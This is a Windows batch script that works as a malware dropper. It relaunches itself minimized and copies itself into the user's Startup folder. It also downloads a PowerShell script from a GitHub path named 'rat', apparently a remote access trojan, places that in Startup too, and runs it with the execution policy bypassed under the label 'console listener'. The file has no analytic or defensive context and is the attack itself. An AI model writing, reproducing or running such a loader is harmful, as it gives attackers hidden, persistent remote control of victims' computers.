@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat" goto startup
goto start 
:startup
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1' -OutFile 'cli.ps1'"
copy "%~dp0cli.ps1" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

echo Starting console listener...
powershell -ExecutionPolicy Bypass -File cli.ps1
pause
exit

:start
echo Starting console listener...
powershell -ExecutionPolicy Bypass -File cli.ps1
pause
exit
